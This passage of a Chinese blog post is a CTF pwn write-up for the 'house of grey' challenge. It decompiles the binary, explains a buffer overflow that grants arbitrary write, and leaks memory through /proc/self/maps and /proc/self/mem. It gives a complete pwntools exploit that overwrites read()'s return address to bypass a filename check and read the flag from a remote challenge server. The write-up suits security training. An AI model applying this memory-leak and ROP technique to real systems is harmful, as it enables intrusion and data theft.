+<p>回到主函数 mmap了一块 0x10000000 bytes 的空间 然后从随机数发生器中读取一个0x10对齐的随机数作为将<code>fn()</code>映射到mmap出来的空间后使用的栈地址 然后启用子线程执行<code>fn()</code></p>
+<p>主线程执行的函数基本可以排除泄露flag的可能 只有4字节的输入并且通过<code>exit()</code>退出 接下来看看fn:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n1.Find something  2.Locate yourself  3.Get something  4.Give something  5.Exit&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">fn</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 offset; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">40</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You get into my room. Just find something!\n&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">0x186A0</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( setbpf() )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v8 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So man, what are you finding?&quot;</span>);</span><br><span class="line">        buf[(<span class="type">int</span>)(read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL) - <span class="number">1</span>)] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( check(buf) )    <span class="comment">//include &#x27;flag&#x27; or &#x27;*&#x27;</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Man, don&#x27;t do it! See you^.&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fd = open(buf, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So, Where are you?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0x20</span>uLL);</span><br><span class="line">        offset = strtoull(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        lseek(fd, offset, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;How many things do you want to get?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">        v3 = atoi(nptr);</span><br><span class="line">        <span class="keyword">if</span> ( v3 &lt;= <span class="number">100000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = read(fd, v8, v3);</span><br><span class="line">          <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error read&quot;</span>);</span><br><span class="line">            perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You get something:&quot;</span>);</span><br><span class="line">          write(<span class="number">1</span>, v8, v4);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You greedy man!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want to give me?&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, v8, <span class="number">0x200</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nI guess you don&#x27;t want to say Goodbye!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But sadly, bye! Hope you come again!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>子线程也加载了沙箱规则 调试时dump出来反汇编一下:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F03%2F20250303-114528.png" alt="image-20250303114527889"></p>
+<p>只能使用fn要用到的功能 所以子线程也是不可能get shell的 只可能对flag orw回显内容</p>
+<p>回到fn函数 一个明显的漏洞点就是<code>buf</code>长度是24字节 但是可以读0x28字节覆盖掉<code>v8</code> 而功能4可以向<code>v8</code>储存的地址写入0x200字节的数据 也就是可以简单地实现任意地址写</p>
+<p>问题是fn函数同样用<code>exit()</code>退出 所以不可能通过修改fn的返回地址来读出flag 而fn中调用的具有输入功能的函数有<code>menu()</code> 和 <code>read()</code> menu中无法利用AAW 而功能4中read函数可以修改自己的返回地址调用ROP链伪造fn的栈帧将[rbp+buf]修改为’flag’ 然后直接返回到<code>open(buf, 0)</code>来绕过检查并利用功能3打印出flag</p>
+<p>现在唯一的问题是fn的栈帧地址是随机的 我们只能通过上文提到的特殊文件系统<code>/proc/self/maps</code>来泄露各个段的基址 然后再通过<code>/proc/self/mem</code>读取100000字节的数据 检查其中是否有fn栈帧中的数据来定位fn栈帧的地址</p>
+<p>由于fn中的功能最多只能使用30次 而100000 * 30字节的数据在mmap出的0x10000000字节下也只占了很小的一段 所以还不一定能在一次远程连接中找到栈帧并进行后续操作 而且前置工作和后续打ROP都需要占用几次功能的使用</p>
+<p>本地调试几次取个平均值加到泄露出的段基址上 然后通过功能2 <code>fseek()</code>定位到此处 通过功能3读取数据并检查 当检测到特定数据存在就计算这个数据所在的地址 再计算read函数的返回地址存放的位置即可做到在一次read后伪造栈帧并写入ROP</p>
+<p>经过调试 栈帧结构如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOW</span><br><span class="line">...</span><br><span class="line">[rbp + buf - 0x38]    -&gt;	read()&#x27;s retaddress</span><br><span class="line">...</span><br><span class="line">[rbp + buf]            -&gt;	buf[24]	-&gt;	b&#x27;/proc/self/maps\x00&#x27;</span><br><span class="line">[rbp + buf + 0x18]    -&gt;	void *v8</span><br><span class="line">...</span><br><span class="line">HIGH</span><br></pre></td></tr></table></figure>
+
+<p>要检查的特定数据就设定为<code>b&#39;/proc&#39;</code></p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ho_grey&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;localhost&#x27;, 20000)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;5.Exit&#x27;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">n</span>):</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;get?&#x27;</span>, <span class="built_in">str</span>(n).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;something:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_offset</span>(<span class="params">n</span>):</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;you?&#x27;</span>, <span class="built_in">str</span>(n).encode())</span><br><span class="line"></span><br><span class="line">program_base = <span class="number">0</span></span><br><span class="line">heap_base = <span class="number">0</span></span><br><span class="line">stack_base = <span class="number">0</span></span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>, xxxxx)</span><br><span class="line">    sla(<span class="string">b&#x27;Y/n?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;finding?&#x27;</span>, <span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;get?&#x27;</span>, <span class="string">b&#x27;10000&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">    maps = ru(<span class="string">b&#x27;Find something&#x27;</span>).decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    program_base = <span class="built_in">int</span>(maps[<span class="number">0</span>].split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    heap_base = <span class="built_in">int</span>(maps[<span class="number">3</span>].split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    stack_base = <span class="built_in">int</span>(maps[<span class="number">4</span>].split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;program_base: &#x27;</span> + <span class="built_in">hex</span>(program_base))</span><br><span class="line">    log.info(<span class="string">&#x27;heap_base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">    log.info(<span class="string">&#x27;stack_base: &#x27;</span> + <span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    mem = <span class="string">b&#x27;/proc/self/mem\x00&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;finding?&#x27;</span>, mem)</span><br><span class="line">    alignn = <span class="number">100000</span></span><br><span class="line">    memo = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    pos = stack_base + <span class="number">0x600000</span></span><br><span class="line">    set_offset(pos)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        log.info(<span class="string">f&#x27;Round: <span class="subst">&#123;<span class="built_in">hex</span>(pos)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            memo = get(alignn)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pos += alignn</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;/proc&#x27;</span> <span class="keyword">in</span> memo:</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">ru(<span class="string">b&#x27;1.Find something&#x27;</span>)</span><br><span class="line">pos = pos - alignn + memo.find(<span class="string">b&#x27;/proc&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Found /proc/self/mem at &#x27;</span> + <span class="built_in">hex</span>(pos))</span><br><span class="line"></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;./run.sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x18</span> - <span class="built_in">len</span>(payload)) + p64(pos - <span class="number">0x38</span>)</span><br><span class="line">sa(<span class="string">b&#x27;finding?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">4</span>)</span><br><span class="line">path = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">path += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x18</span> - <span class="built_in">len</span>(path)) + p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">sa(<span class="string">b&#x27;content: &#x27;</span>, p64(program_base + <span class="number">0x1150</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x30</span> + path)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+<p>其中本地拿到flag不需要在写入ROP和<code>b&#39;flag&#39;</code>时进一步覆盖掉<code>v8</code> 而远程拿到flag需要将v8地址覆盖成一个可读可写的地址</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>1K0CT B14s
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://ikoct.com/2025/03/03/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6/" title="Linux中的虚拟文件">https://ikoct.com/2025/03/03/Linux中的虚拟文件/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+              <a href="/tags/Linux/" rel="tag"># Linux</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/02/25/IO-FILE%E6%94%BB%E5%87%BB/" rel="prev" title="IO FILE攻击">
+      <i class="fa fa-chevron-left"></i> IO FILE攻击
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-number">1.</span> <span class="nav-text">Linux 虚拟文件系统</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E4%B8%AA%E5%AD%90%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">各个子文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-self-cmdline"><span class="nav-number">1.1.1.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;cmdline</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-self-environ"><span class="nav-number">1.1.2.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;environ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-self-exe"><span class="nav-number">1.1.3.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-self-fd"><span class="nav-number">1.1.4.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-self-maps"><span class="nav-number">1.1.5.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;maps</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-self-mem"><span class="nav-number">1.1.6.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;mem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-self-stat"><span class="nav-number">1.1.7.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;stat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-self-status"><span class="nav-number">1.1.8.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;status</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E4%B8%BE%E4%BE%8B"><span class="nav-number">1.2.</span> <span class="nav-text">应用举例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-house-of-grey"><span class="nav-number">1.2.1.</span> <span class="nav-text">[攻防世界] house of grey</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="1K0CT B14s"
+      src="/images/myavatar.gif">
+  <p class="site-author-name" itemprop="name">1K0CT B14s</p>
+  <div class="site-description" itemprop="description">残りの人生、私にくれませんか？</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+-->
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1K0CT B14s</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">470k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">7:07</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>-->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
